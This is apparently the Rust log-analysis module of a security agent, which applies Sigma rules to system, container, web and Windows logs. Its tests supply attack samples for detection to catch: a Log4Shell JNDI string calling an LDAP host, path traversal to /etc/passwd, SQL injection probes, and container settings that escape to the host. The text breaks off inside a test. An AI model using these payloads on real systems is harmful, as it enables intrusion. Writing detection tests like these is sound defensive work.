// Copyright (c) 2024-2026 Cyber Threat Consulting
// SPDX-License-Identifier: MIT

//! Detection rules on the logs, as they are written.
//!
//! Four things are read: the system log through a stream kept open
//! ([`agent_siem::stream`]), the container events of Docker and Podman when
//! they are there (Linux), the declared log files ([`agent_siem::logfile`]) and, on
//! Windows, the event channels. Every
//! line is decoded into fields ([`agent_siem::decode`]) and given to the
//! Sigma rules written for a log source and to the correlation rules
//! ([`agent_scanner::security::sigma_logs`]).
//!
//! A rule of level `medium` or above raises an incident, which follows the
//! same path as any other (platform, interface, playbooks). A rule of level
//! `low` or `informational` describes ordinary activity worth keeping: it
//! becomes a SIEM event only.
//!
//! # Not being flooded
//!
//! An attacker trying a thousand passwords must not raise a hundred
//! incidents. The same rule, for the same group (the address, the account),
//! raises one incident per [`SUPPRESSION`]; what it matches meanwhile is
//! counted in the logs. At most [`MAX_INCIDENTS_PER_PASS`] incidents leave
//! one pass of the main loop.

use agent_common::config::{AgentConfig, LogFileConfig, LogFileFormat};
use agent_common::constants::AGENT_VERSION;
use agent_scanner::SecurityIncident;
use agent_scanner::security::sigma::{LogCoverage, SigmaEvent, SigmaLevel};
use agent_scanner::security::sigma_logs::{self, Detection, LogEvent, LogRuleEngine};
use agent_siem::decode::DecodedLog;
use agent_siem::logfile::LogFileTailer;
use agent_siem::stream::LogStream;
use agent_siem::{EventCategory, SiemEvent};
use chrono::{DateTime, Duration, Utc};
use std::collections::HashMap;
use std::time::Instant;
use tracing::{debug, info, warn};

use super::AgentRuntime;

/// Events evaluated at most in one pass of the main loop.
const MAX_EVENTS_PER_PASS: usize = 5_000;
/// Incidents raised at most in one pass of the main loop.
const MAX_INCIDENTS_PER_PASS: usize = 20;
/// SIEM events recorded at most in one pass for the low-level rules.
const MAX_RECORDS_PER_PASS: usize = 200;
/// Time during which a rule that raised an incident for a group stays
/// silent for that group.
const SUPPRESSION: Duration = Duration::minutes(15);
/// Groups remembered at most as recently reported.
const MAX_SUPPRESSED: usize = 10_000;
/// Time between two attempts to start a stream that stopped.
const STREAM_RETRY: std::time::Duration = std::time::Duration::from_secs(300);
/// Time between two looks for a container engine, or attempts to follow it
/// again (Docker's daemon restarts when it is updated).
#[cfg_attr(not(target_os = "linux"), allow(dead_code))]
const DOCKER_RETRY: std::time::Duration = std::time::Duration::from_secs(60);
/// Time between two readings of the Windows event channels.
#[cfg(target_os = "windows")]
const WINDOWS_READ_EVERY: std::time::Duration = std::time::Duration::from_secs(30);

/// The files read when a Linux system has no journal to follow.
const LINUX_FALLBACK_FILES: &[&str] = &["/var/log/auth.log", "/var/log/secure"];

/// What the rules found in the log events of one pass.
#[derive(Default)]
pub(crate) struct LogFindings {
    /// Who the system's audit says touched which file (an audit record on
    /// Linux, an object access event on Windows).
    pub file_actors: Vec<(String, agent_common::types::FimActor)>,
    pub incidents: Vec<SecurityIncident>,
    /// Matches of the low-level rules, and the incidents, as SIEM events.
    pub records: Vec<SiemEvent>,
}

/// The container events of one engine, while it is there.
#[cfg_attr(not(target_os = "linux"), allow(dead_code))]
struct EngineEvents {
    engine: agent_siem::stream::Engine,
    stream: Option<LogStream>,
    /// When to look for the engine again.
    next_attempt: Option<Instant>,
    /// Why the engine could not be followed, told once.
    failure: Option<String>,
}

impl EngineEvents {
    fn all() -> Vec<Self> {
        agent_siem::stream::Engine::ALL
            .iter()
            .map(|engine| Self {
                engine: *engine,
                stream: None,
                next_attempt: None,
                failure: None,
            })
            .collect()
    }

    /// Follow the engine when it is there: from the moment it appears, and
    /// again after it stopped (Docker's daemon restarted).
    #[cfg(target_os = "linux")]
    fn ensure(&mut self) {
        if self.stream.as_ref().is_some_and(LogStream::is_running) {
            return;
        }
        let name = self.engine.name();
        if self.stream.take().is_some() {
            info!("The {name} events stopped: they will be followed again");
        }
        if self.next_attempt.is_some_and(|at| Instant::now() < at) {
            return;
        }
        self.next_attempt = Some(Instant::now() + DOCKER_RETRY);
        if self.engine.program().is_none() {
            return;
        }
        match LogStream::start_containers(self.engine) {
            Ok(stream) => {
                info!("The {name} container events are analysed as they happen");
                self.stream = Some(stream);
                self.failure = None;
            }
            Err(e) => {
                if self.failure.as_ref() != Some(&e) {
                    warn!("The {name} container events cannot be followed: {}", e);
                }
                self.failure = Some(e);
            }
        }
    }
}

/// The log sources, the rules, and what was recently reported.
pub(crate) struct LogAnalysis {
    engine: LogRuleEngine,
    stream: Option<LogStream>,
    all_programs: bool,
    /// When a stream that is not running may be started again.
    next_stream_attempt: Option<Instant>,
    /// The container events of each engine of the host.
    containers: Vec<EngineEvents>,
    tailer: LogFileTailer,
    /// Events read outside the pass (the Windows channels).
    pending: Vec<DecodedLog>,
    /// Until when each rule is silent for each group, and what it matched
    /// meanwhile.
    suppressed: HashMap<String, (DateTime<Utc>, u32)>,
    /// Audit records waiting for the other half of their event.
    audit_events: crate::fim_attribution::AuditEvents,
    hostname: String,
    #[cfg(target_os = "windows")]
    windows: Option<agent_siem::stream::WindowsEventReader>,
    #[cfg(target_os = "windows")]
    last_windows_read: Instant,
}

fn state_path(name: &str) -> std::path::PathBuf {
    AgentConfig::platform_data_dir().join("logs").join(name)
}

/// The log sources rules can be written for on this endpoint: what the
/// stream gives, and what the declared files give.
pub(crate) fn coverage(tailer: &LogFileTailer) -> LogCoverage {
    let mut coverage = LogCoverage::default();
    coverage
        .services
        .extend(agent_siem::stream::stream_services());
    coverage.services.extend(tailer.services());
    coverage.categories.extend(tailer.categories());
    coverage
}

/// Follow the authentication logs of a Linux system whose journal cannot be
/// followed: they hold the same lines. Never both, or every line would be
/// counted twice. Returns the files added.
fn follow_fallback_files(tailer: &mut LogFileTailer, candidates: &[&str]) -> Vec<String> {
    let mut added = Vec::new();
    for path in candidates {
        if !std::path::Path::new(path).is_file() || tailer.is_following(path) {
            continue;
        }
        let spec = LogFileConfig {
            path: (*path).to_string(),
            format: LogFileFormat::Syslog,
            service: Some("auth".to_string()),
        };
        if tailer.follow(&spec).is_ok() {
            added.push((*path).to_string());
        }
    }
    added
}

impl LogAnalysis {
    /// Prepare the log sources and load the rules of `rules_dir`. Returns
    /// the rules for processes found in the same directory, and what was
    /// loaded.
    pub(crate) fn load(
        config: &AgentConfig,
        rules_dir: &std::path::Path,
    ) -> (Self, agent_scanner::security::sigma::LoadedRules) {
        // Only Linux follows one more file below.
        #[cfg_attr(not(target_os = "linux"), allow(unused_mut))]
        let (mut tailer, errors) =
            LogFileTailer::new(&config.log_files, Some(state_path("positions.json")));
        for error in errors {
            warn!("Log file not followed: {}", error);
        }
        // The records of the audit watches added for the watched files.
        #[cfg(target_os = "linux")]
        if config.fim_whodata && !tailer.is_following(crate::fim_audit::AUDIT_LOG) {
            let _ = tailer.follow(&LogFileConfig {
                path: crate::fim_audit::AUDIT_LOG.to_string(),
                format: LogFileFormat::Audit,
                service: Some("auditd".to_string()),
            });
        }
        // The watched commands are log sources too, named after them.
        let mut coverage = coverage(&tailer);
        coverage.services.extend(
            config
                .command_monitors
                .iter()
                .map(|command| command.name.to_ascii_lowercase()),
        );
        let (loaded, engine) = sigma_logs::load(rules_dir, &coverage);
        let analysis = Self {
            engine,
            stream: None,
            all_programs: config.log_analysis_all_programs,
            next_stream_attempt: Some(Instant::now()),
            containers: EngineEvents::all(),
            tailer,
            pending: Vec::new(),
            suppressed: HashMap::new(),
            audit_events: crate::fim_attribution::AuditEvents::default(),
            hostname: hostname::get()
                .map(|h| h.to_string_lossy().to_string())
                .unwrap_or_default(),
            #[cfg(target_os = "windows")]
            windows: Some(agent_siem::stream::WindowsEventReader::new(Some(
                state_path("event-bookmarks.json"),
            ))),
            #[cfg(target_os = "windows")]
            last_windows_read: Instant::now() - WINDOWS_READ_EVERY,
        };
        (analysis, loaded)
    }

    /// Start the stream of the system log when it is not running and its
    /// time has come.
    fn ensure_stream(&mut self) {
        if cfg!(target_os = "windows") {
            return; // read at intervals, see `read_windows_events`
        }
        if self.stream.as_ref().is_some_and(LogStream::is_running) {
            return;
        }
        if self.stream.take().is_some() {
            warn!("The system log stream stopped: it will be started again");
            self.next_stream_attempt = Some(Instant::now() + STREAM_RETRY);
        }
        if self
            .next_stream_attempt
            .is_none_or(|at| Instant::now() < at)
        {
            return;
        }
        match LogStream::start(self.all_programs) {
            Ok(stream) => {
                info!(
                    "The system log is analysed as it is written ({})",
                    stream.kind()
                );
                self.stream = Some(stream);
                self.next_stream_attempt = None;
            }
            Err(e) => {
                if cfg!(target_os = "linux") {
                    let added = follow_fallback_files(&mut self.tailer, LINUX_FALLBACK_FILES);
                    if !added.is_empty() {
                        info!("Following {} instead of the journal", added.join(", "));
                    }
                }
                if self.tailer.is_empty() {
                    warn!(
                        "The system log cannot be followed ({}): no log is analysed",
                        e
                    );
                } else {
                    warn!(
                        "The system log cannot be followed ({}): only the log files are analysed",
                        e
                    );
                }
                // The files now stand for the journal: starting it later
                // would count every line twice.
                self.next_stream_attempt = if cfg!(target_os = "linux") && !self.tailer.is_empty() {
                    None
                } else {
                    Some(Instant::now() + STREAM_RETRY)
                };
            }
        }
    }

    /// Follow the container events of the engines of the host (Linux).
    fn ensure_containers(&mut self) {
        #[cfg(target_os = "linux")]
        for engine in &mut self.containers {
            engine.ensure();
        }
    }

    /// The events written since the last pass.
    fn read(&mut self) -> Vec<DecodedLog> {
        let mut logs = std::mem::take(&mut self.pending);
        let containers = self
            .containers
            .iter()
            .filter_map(|engine| engine.stream.as_ref());
        for stream in self.stream.iter().chain(containers) {
            logs.extend(stream.drain(MAX_EVENTS_PER_PASS.saturating_sub(logs.len())));
            let dropped = stream.take_dropped();
            if dropped > 0 {
                warn!(
                    "{} events of {} were dropped: they arrive faster than they are analysed",
                    dropped,
                    stream.kind()
                );
            }
        }
        logs.extend(self.tailer.read());
        logs
    }

    /// What the group of a detection is: the group of a correlation, or the
    /// address and accounts of the event for a plain rule.
    fn suppression_key(detection: &Detection, fields: &SigmaEvent) -> String {
        let mut key = detection.rule_id.clone();
        match &detection.correlation {
            Some(hit) => {
                for (_, value) in &hit.group {
                    key.push('|');
                    key.push_str(value);
                }
            }
            None => {
                // Two containers started privileged are two incidents.
                for field in ["src_ip", "user", "target_user", "container"] {
                    key.push('|');
                    key.push_str(fields.get(field).map_or("", String::as_str));
                }
            }
        }
        key
    }

    /// Whether the detection may raise an incident now; records that it did.
    fn admit(&mut self, detection: &Detection, fields: &SigmaEvent, now: DateTime<Utc>) -> bool {
        let key = Self::suppression_key(detection, fields);
        if let Some((until, matched)) = self.suppressed.get_mut(&key)
            && now < *until
        {
            *matched += 1;
            return false;
        }
        if self.suppressed.len() >= MAX_SUPPRESSED {
            self.suppressed.retain(|_, (until, _)| now < *until);
        }
        if self.suppressed.len() < MAX_SUPPRESSED {
            self.suppressed.insert(key, (now + SUPPRESSION, 0));
        }
        true
    }

    /// Say what the silent rules matched, and forget the groups whose time
    /// is over.
    fn forget_expired(&mut self, now: DateTime<Utc>) {
        self.suppressed.retain(|key, (until, matched)| {
            if now < *until {
                return true;
            }
            if *matched > 0 {
                let rule = key.split('|').next().unwrap_or(key);
                debug!(
                    "Log rule {} matched {} more time(s) for the same group while silent",
                    rule, matched
                );
            }
            false
        });
    }

    fn record(&self, detection: &Detection, log: &DecodedLog, at: DateTime<Utc>) -> SiemEvent {
        let severity = match detection.level {
            SigmaLevel::Critical => 10,
            SigmaLevel::High => 8,
            SigmaLevel::Medium => 5,
            SigmaLevel::Low => 3,
            SigmaLevel::Informational => 2,
        };
        let category = if log.services.iter().any(|service| service == "auth") {
            EventCategory::Authentication
        } else if log.get("src_ip").is_some() {
            EventCategory::Network
        } else {
            EventCategory::Security
        };
        SiemEvent {
            timestamp: at,
            severity,
            category,
            name: detection.title.clone(),
            description: log
                .get("message")
                .unwrap_or_default()
                .chars()
                .take(512)
                .collect(),
            source_host: log
                .get("hostname")
                .map_or_else(|| self.hostname.clone(), str::to_string),
            source_ip: log.get("src_ip").map(str::to_string),
            destination_ip: log.get("dst_ip").map(str::to_string),
            destination_port: log.get("dst_port").and_then(|port| port.parse().ok()),
            user: log.get("user").map(str::to_string),
            process_name: log.get("program").map(str::to_string),
            process_id: log.get("pid").and_then(|pid| pid.parse().ok()),
            file_path: None,
            custom_fields: serde_json::json!({
                "detection": "sigma_log",
                "rule_id": detection.rule_id,
                "level": format!("{:?}", detection.level).to_lowercase(),
                "attack_techniques": detection.attack_techniques(),
                "log_source": log.source(),
                "action": log.get("action"),
            }),
            event_id: uuid::Uuid::new_v4().to_string(),
            agent_version: AGENT_VERSION.to_string(),
        }
    }

    /// Give the events to the rules.
    fn evaluate(&mut self, logs: Vec<DecodedLog>, now: DateTime<Utc>) -> LogFindings {
        let mut findings = LogFindings::default();
        let mut withheld = 0usize;
        for log in &logs {
            // The time of the event, never later than now: a clock ahead on
            // the machine that wrote the line must not push counts forward.
            let timestamp = log.timestamp.map_or(now, |time| time.min(now));
            if findings.file_actors.len() < MAX_EVENTS_PER_PASS {
                let actor = if log.services.iter().any(|service| service == "auditd") {
                    self.audit_events.read(&log.fields)
                } else {
                    crate::fim_attribution::windows_object_access(&log.fields)
                };
                findings.file_actors.extend(actor);
            }
            let detections = self.engine.evaluate(&LogEvent {
                services: &log.services,
                categories: &log.categories,
                fields: &log.fields,
                timestamp,
            });
            for detection in detections {
                if !detection.is_incident() {
                    if findings.records.len() < MAX_RECORDS_PER_PASS {
                        findings
                            .records
                            .push(self.record(&detection, log, timestamp));
                    }
                    continue;
                }
                if !self.admit(&detection, &log.fields, now) {
                    continue;
                }
                if findings.incidents.len() >= MAX_INCIDENTS_PER_PASS {
                    withheld += 1;
                    continue;
                }
                findings
                    .records
                    .push(self.record(&detection, log, timestamp));
                findings.incidents.push(sigma_logs::incident(
                    &detection,
                    &log.fields,
                    log.source(),
                ));
            }
        }
        if withheld > 0 {
            warn!(
                "{} more log detections in this pass are not reported individually (limit of {})",
                withheld, MAX_INCIDENTS_PER_PASS
            );
        }
        self.forget_expired(now);
        findings
    }

    /// Read the log events written since the last pass and give them to the
    /// rules.
    pub(crate) fn pass(&mut self) -> LogFindings {
        self.ensure_stream();
        self.ensure_containers();
        let logs = self.read();
        if logs.is_empty() {
            return LogFindings::default();
        }
        self.evaluate(logs, Utc::now())
    }

    fn stop(&mut self) {
        let containers = self
            .containers
            .iter_mut()
            .filter_map(|engine| engine.stream.take());
        for stream in self.stream.take().into_iter().chain(containers) {
            stream.stop();
        }
    }
}

impl AgentRuntime {
    /// What the rules found in the logs since the last pass.
    pub(crate) fn take_log_findings(&self) -> LogFindings {
        let mut guard = self.log_analysis.lock().unwrap_or_else(|e| e.into_inner());
        match guard.as_mut() {
            Some(analysis) => analysis.pass(),
            None => LogFindings::default(),
        }
    }

    /// Read the Windows event channels when their time has come. The events
    /// are evaluated at the next pass.
    #[cfg(target_os = "windows")]
    pub(crate) async fn read_windows_events(&self) {
        let reader = {
            let mut guard = self.log_analysis.lock().unwrap_or_else(|e| e.into_inner());
            let Some(analysis) = guard.as_mut() else {
                return;
            };
            if analysis.last_windows_read.elapsed() < WINDOWS_READ_EVERY {
                return;
            }
            analysis.last_windows_read = Instant::now();
            analysis.windows.take()
        };
        let Some(mut reader) = reader else {
            return;
        };
        let events = reader.read().await;
        let mut guard = self.log_analysis.lock().unwrap_or_else(|e| e.into_inner());
        if let Some(analysis) = guard.as_mut() {
            match events {
                Ok(events) => analysis.pending.extend(events),
                Err(e) => debug!("Windows event channels not read: {}", e),
            }
            analysis.windows = Some(reader);
        }
    }

    /// Give the rules events read elsewhere (the output of the watched
    /// commands); they are evaluated at the next pass. Nothing happens when
    /// the log analysis is off.
    pub(crate) fn add_log_events(&self, events: Vec<DecodedLog>) {
        if let Some(analysis) = self
            .log_analysis
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .as_mut()
        {
            let room = MAX_EVENTS_PER_PASS.saturating_sub(analysis.pending.len());
            analysis.pending.extend(events.into_iter().take(room));
        }
    }

    /// Stop reading the system log.
    pub(crate) fn stop_log_analysis(&self) {
        if let Some(analysis) = self
            .log_analysis
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .as_mut()
        {
            analysis.stop();
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use agent_scanner::IncidentSeverity;
    use agent_siem::decode;

    /// An analysis with the rules shipped with the agent and no source: the
    /// events are given by the tests. Their scenarios are those of a Unix
    /// endpoint (sshd, sudo): where the tests run on Windows, the rules an
    /// agent on Linux loads are used.
    fn analysis() -> LogAnalysis {
        match agent_scanner::security::sigma::host_product() {
            "windows" => analysis_for("linux"),
            host => analysis_for(host),
        }
    }

    /// The same, with the rules an agent on another system would load: the
    /// rules written for Linux and Windows are tested wherever the tests run.
    fn analysis_for(product: &str) -> LogAnalysis {
        let dir = tempfile::tempdir().unwrap();
        let (tailer, _) = LogFileTailer::new(&[], None);
        // The sources of every system, not only of the one the tests run on.
        let mut coverage = coverage(&tailer);
        coverage.categories.insert("webserver".to_string());
        for service in [
            "auth",
            "syslog",
            "sshd",
            "sudo",
            "su",
            "cron",
            "screensharingd",
            "auditd",
            "kernel",
            "containers",
            "docker",
            "podman",
            "security",
            "system",
            "powershell",
            "windefend",
        ] {
            coverage.services.insert(service.to_string());
        }
        // Only administrators may write the directory, as in the agent's.
        #[cfg(windows)]
        agent_common::windows_acl::secure_data_dir(dir.path()).unwrap();
        let (loaded, engine) = sigma_logs::load_for(dir.path(), &coverage, product);
        assert!(
            loaded.report.errors.is_empty(),
            "{:?}",
            loaded.report.errors
        );
        LogAnalysis {
            engine,
            stream: None,
            all_programs: false,
            next_stream_attempt: None,
            containers: EngineEvents::all(),
            tailer,
            pending: Vec::new(),
            suppressed: HashMap::new(),
            audit_events: crate::fim_attribution::AuditEvents::default(),
            hostname: "host".to_string(),
            #[cfg(target_os = "windows")]
            windows: None,
            #[cfg(target_os = "windows")]
            last_windows_read: Instant::now(),
        }
    }

    fn now() -> DateTime<Utc> {
        DateTime::from_timestamp(1_800_000_000, 0).unwrap()
    }

    /// A syslog line written `seconds` after the reference time.
    fn line(seconds: i64, program: &str, message: &str) -> DecodedLog {
        let mut log = decode::decode_program(program, Some(812), message);
        log.timestamp = Some(now() + Duration::seconds(seconds));
        log
    }

    fn titles(findings: &LogFindings) -> Vec<&str> {
        findings
            .incidents
            .iter()
            .map(|incident| incident.title.as_str())
            .collect()
    }

    fn failed_ssh(seconds: i64, ip: &str, user: &str) -> DecodedLog {
        line(
            seconds,
            "sshd",
            &format!("Failed password for {user} from {ip} port 4444 ssh2"),
        )
    }

    /// The scenario the shipped rules exist for: an address tries passwords,
    /// finds one, and the account it took is used to become root.
    #[test]
    fn a_brute_force_that_succeeds_is_followed_from_the_first_failure() {
        let mut analysis = analysis();
        let later = now() + Duration::hours(1);

        let attempts: Vec<DecodedLog> = (0..8)
            .map(|second| failed_ssh(second, "203.0.113.9", "root"))
            .collect();
        let findings = analysis.evaluate(attempts, later);
        assert_eq!(titles(&findings), ["Sigma: Attaque par force brute SSH"]);
        let incident = &findings.incidents[0];
        assert_eq!(incident.severity, IncidentSeverity::High);
        assert_eq!(incident.evidence["correlation"]["count"], 8);
        assert_eq!(incident.evidence["event"]["src_ip"], "203.0.113.9");
        assert_eq!(incident.evidence["attack_techniques"][0], "T1110.001");

        let findings = analysis.evaluate(
            vec![line(
                60,
                "sshd",
                "Accepted password for root from 203.0.113.9 port 4445 ssh2",
            )],
            later,
        );
        assert_eq!(
            titles(&findings),
            ["Sigma: Connexion SSH réussie après une attaque par force brute"]
        );
        assert_eq!(findings.incidents[0].severity, IncidentSeverity::Critical);
        // The login itself and the direct root login are recorded, not raised.
        let recorded: Vec<&str> = findings.records.iter().map(|r| r.name.as_str()).collect();
        assert!(recorded.contains(&"Connexion SSH réussie"), "{recorded:?}");
        assert!(
            recorded.contains(&"Connexion SSH directe en root"),
            "{recorded:?}"
        );
    }

    #[test]
    fn a_thousand_attempts_from_one_address_are_one_incident() {
        let mut analysis = analysis();
        let later = now() + Duration::hours(1);
        let attempts: Vec<DecodedLog> = (0..1_000)
            .map(|n| failed_ssh(n / 10, "203.0.113.9", "root"))
            .collect();
        let findings = analysis.evaluate(attempts, later);
        assert_eq!(titles(&findings), ["Sigma: Attaque par force brute SSH"]);

        // Another address is another group; the same one after the silence
        // is reported again.
        let other: Vec<DecodedLog> = (0..8)
            .map(|second| failed_ssh(200 + second, "198.51.100.7", "root"))
            .collect();
        assert_eq!(analysis.evaluate(other, later).incidents.len(), 1);
        let again: Vec<DecodedLog> = (0..8)
            .map(|second| failed_ssh(3_000 + second, "203.0.113.9", "root"))
            .collect();
        let much_later = later + SUPPRESSION + Duration::seconds(1);
        assert_eq!(analysis.evaluate(again, much_later).incidents.len(), 1);
    }

    #[test]
    fn many_accounts_tried_from_one_address_is_spraying() {
        let mut analysis = analysis();
        let attempts: Vec<DecodedLog> = ["root", "admin", "oracle", "git", "postgres", "ubuntu"]
            .iter()
            .enumerate()
            .map(|(second, user)| {
                line(
                    second as i64,
                    "sshd",
                    &format!(
                        "Failed password for invalid user {user} from 203.0.113.9 port 4444 ssh2"
                    ),
                )
            })
            .collect();
        let findings = analysis.evaluate(attempts, now() + Duration::hours(1));
        assert_eq!(
            titles(&findings),
            ["Sigma: Pulvérisation de mots de passe SSH"]
        );
    }

    #[test]
    fn privilege_and_account_changes_raise_what_they_should() {
        let mut analysis = analysis();
        let later = now() + Duration::hours(1);
        let mut check = |program: &str, message: &str, expected: &[&str]| {
            let findings = analysis.evaluate(vec![line(0, program, message)], later);
            let mut found = titles(&findings);
            found.sort_unstable();
            assert_eq!(found, expected, "{program}: {message}");
        };

        check(
            "sudo",
            "     bob : user NOT in sudoers ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash",
            &["Sigma: Tentative sudo d'un compte non autorisé"],
        );
        check(
            "sudo",
            "   alice : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/id",
            &["Sigma: Mots de passe sudo refusés à plusieurs reprises"],
        );
        // An ordinary command, or a script asking without a password: nothing.
        check(
            "sudo",
            "   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update",
            &[],
        );
        check(
            "sudo",
            "carol : a password is required ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/true",
            &[],
        );

        check(
            "useradd",
            "new user: name=deploy, UID=1001, GID=1001, home=/home/deploy, shell=/bin/bash, from=/dev/pts/0",
            &["Sigma: Compte utilisateur créé"],
        );
        check(
            "useradd",
            "new user: name=toor, UID=0, GID=0, home=/root, shell=/bin/bash, from=/dev/pts/0",
            &["Sigma: Compte créé avec l'UID 0"],
        );
        check(
            "usermod",
            "add 'deploy' to group 'sudo'",
            &["Sigma: Compte ajouté à un groupe privilégié"],
        );
        check("usermod", "add 'dave' to group 'audio'", &[]);
    }

    #[test]
    fn kernel_lines_tell_a_capture_from_a_container_and_a_scan_from_noise() {
        let mut analysis = analysis_for("linux");
        let later = now() + Duration::hours(1);
        let capture = analysis.evaluate(
            vec![line(0, "kernel", "device eth0 entered promiscuous mode")],
            later,
        );
        assert_eq!(
            titles(&capture),
            ["Sigma: Interface réseau passée en mode promiscuité"]
        );
        let container = analysis.evaluate(
            vec![line(
                1,
                "kernel",
                "device veth3f2a1b entered promiscuous mode",
            )],
            later,
        );
        assert!(container.incidents.is_empty());

        let scan = |ip: &str| -> Vec<DecodedLog> {
            (0..20)
                .map(|port| {
                    line(
                        10 + port,
                        "kernel",
                        &format!(
                            "[UFW BLOCK] IN=eth0 OUT= SRC={ip} DST=192.168.1.10 PROTO=TCP SPT=40000 DPT={}",
                            1_000 + port
                        ),
                    )
                })
                .collect()
        };
        let internal = analysis.evaluate(scan("192.168.1.77"), later);
        assert_eq!(
            titles(&internal),
            ["Sigma: Balayage de ports depuis le réseau interne"]
        );
        // The same from the Internet is what every exposed machine receives.
        assert!(
            analysis
                .evaluate(scan("203.0.113.9"), later)
                .incidents
                .is_empty()
        );
    }

    /// A container event, completed by what `docker inspect` says of it.
    fn container(seconds: i64, name: &str, action: &str, inspect: Option<&str>) -> DecodedLog {
        let mut log = decode::decode_docker_event(&format!(
            r#"{{"Type":"container","Action":"{action}","time":{},"Actor":{{"ID":"id-{name}","Attributes":{{"name":"{name}","image":"alpine"}}}}}}"#,
            now().timestamp() + seconds
        ))
        .unwrap();
        if let Some(inspect) = inspect {
            decode::add_docker_settings(&mut log, inspect);
        }
        log
    }

    #[test]
    fn a_container_that_can_take_the_host_is_raised_not_an_ordinary_one() {
        let mut analysis = analysis_for("linux");
        let later = now() + Duration::hours(1);
        let ordinary = r#"[{"Config":{"User":"app"},"HostConfig":{"Privileged":false,"PidMode":"","CapAdd":["NET_BIND_SERVICE"]},
            "Mounts":[{"Source":"/srv/app","Destination":"/app"}]}]"#;
        let found = analysis.evaluate(
            vec![
                container(0, "web", "create", None),
                container(1, "web", "start", Some(ordinary)),
                container(
                    2,
                    "web",
                    "exec_start: /bin/sh -c curl -f http://localhost/",
                    None,
                ),
                container(3, "web", "die", None),
            ],
            later,
        );
        assert!(found.incidents.is_empty(), "{:?}", titles(&found));
        assert!(found.records.is_empty());

        let escape = r#"[{"Config":{"User":""},"HostConfig":{"Privileged":true,"PidMode":"host",
            "CapAdd":["SYS_ADMIN"],"SecurityOpt":["seccomp=unconfined"]},
            "Mounts":[{"Source":"/","Destination":"/host"},{"Source":"/var/run/docker.sock","Destination":"/var/run/docker.sock"}]}]"#;
        let mut found = analysis.evaluate(
            vec![
                container(10, "escape", "start", Some(escape)),
                container(
                    11,
                    "other",
                    "start",
                    Some(r#"[{"HostConfig":{"Privileged":true}}]"#),
                ),
            ],
            later,
        );
        let mut raised = titles(&found);
        raised.sort_unstable();
        assert_eq!(
            raised,
            [
                "Sigma: Conteneur dans l'espace des processus de l'hôte",
                "Sigma: Conteneur doté de capacités qui permettent d'en sortir",
                "Sigma: Conteneur privilégié démarré",
                "Sigma: Conteneur privilégié démarré",
                "Sigma: Conteneur qui monte la racine de l'hôte",
                "Sigma: Conteneur qui monte le socket du moteur de conteneurs",
                "Sigma: Conteneur sans profil de sécurité",
            ]
        );
        // Two containers started privileged are two incidents.
        found
            .incidents
            .retain(|incident| incident.title.ends_with("privilégié démarré"));
        assert_eq!(found.incidents.len(), 2);

        // An interactive shell: recorded, not raised.
        let shell = analysis.evaluate(vec![container(20, "web", "exec_start: bash", None)], later);
        assert!(shell.incidents.is_empty());
        assert_eq!(shell.records.len(), 1);
        assert_eq!(
            shell.records[0].name,
            "Shell interactif ouvert dans un conteneur"
        );
    }

    fn access(seconds: i64, ip: &str, request: &str, status: u16, agent: &str) -> DecodedLog {
        let mut log = decode::decode_access_line(&format!(
            "{ip} - - [10/Oct/2026:13:55:36 +0000] \"{request} HTTP/1.1\" {status} 512 \"-\" \"{agent}\""
        ))
        .unwrap();
        log.timestamp = Some(now() + Duration::seconds(seconds));
        log.services.push("nginx".to_string());
        log
    }

    #[test]
    fn web_attacks_are_told_from_ordinary_requests() {
        let mut analysis = analysis();
        let later = now() + Duration::hours(1);
        let browser = "Mozilla/5.0";

        let ordinary = analysis.evaluate(
            vec![
                access(0, "198.51.100.7", "GET /index.html", 200, browser),
                access(1, "198.51.100.7", "GET /missing", 404, browser),
                access(2, "198.51.100.7", "POST /login", 401, browser),
            ],
            later,
        );
        assert!(ordinary.incidents.is_empty());

        let read = analysis.evaluate(
            vec![access(
                10,
                "203.0.113.9",
                "GET /view?file=../../../../etc/passwd",
                200,
                browser,
            )],
            later,
        );
        assert_eq!(
            titles(&read),
            ["Sigma: Fichier système lu par traversée de répertoire"]
        );
        assert_eq!(read.incidents[0].evidence["log_source"], "nginx");
        // The same request refused is an attempt, counted, not an incident.
        let refused = analysis.evaluate(
            vec![access(
                11,
                "203.0.113.10",
                "GET /view?file=../../../../etc/passwd",
                403,
                browser,
            )],
            later,
        );
        assert!(refused.incidents.is_empty());

        let log4shell = analysis.evaluate(
            vec![access(
                20,
                "203.0.113.11",
                "GET /",
                200,
                "${jndi:ldap://203.0.113.11/a}",
            )],
            later,
        );
        assert_eq!(
            titles(&log4shell),
            ["Sigma: Tentative d'exploitation Log4Shell"]
        );

        let scan: Vec<DecodedLog> = (0..10)
            .map(|n| {
                access(
                    30 + n,
                    "203.0.113.12",
                    &format!("GET /item?id={n}%20union%20select%201"),
                    500,
                    browser,
                )
            })
            .collect();
        assert_eq!(
            titles(&analysis.evaluate(scan, later)),
            ["Sigma: Balayage d'attaques web"]
        );

        let enumeration: Vec<DecodedLog> = (0..60)
            .map(|n| {
                access(
                    100 + n,
                    "203.0.113.13",
                    &format!("GET /dir{n}/"),
                    404,
                    browser,
                )
            })
            .collect();
        assert_eq!(
            titles(&analysis.evaluate(enumeration, later)),
            ["Sigma: Énumération du contenu d'un site web"]
        );
    }

    fn windows(seconds: i64, id: u32, channel: &str, data: serde_json::Value) -> DecodedLog {
        let mut log = decode::decode_windows_event(&serde_json::json!({
            "Id": id, "Channel": channel, "Data": data
        }))
        .unwrap();
        log.timestamp = Some(now() + Duration::seconds(seconds));
        log
    }

    #[test]
    fn windows_events_raise_what_they_should() {
        let mut analysis = analysis_for("windows");
        let later = now() + Duration::hours(1);
        let cleared = analysis.evaluate(
            vec![windows(0, 1102, "Security", serde_json::json!({}))],
            later,
        );
        assert_eq!(
            titles(&cleared),
            ["Sigma: Journal de sécurité Windows effacé"]
        );

        let failures: Vec<DecodedLog> = (0..10)
            .map(|n| {
                windows(
                    10 + n,
                    4625,
                    "Security",
                    serde_json::json!({"TargetUserName": "Administrator", "IpAddress": "203.0.113.9"}),
                )
            })
            .collect();
        let mut found = titles(&analysis.evaluate(failures, later))
            .into_iter()
            .map(str::to_string)
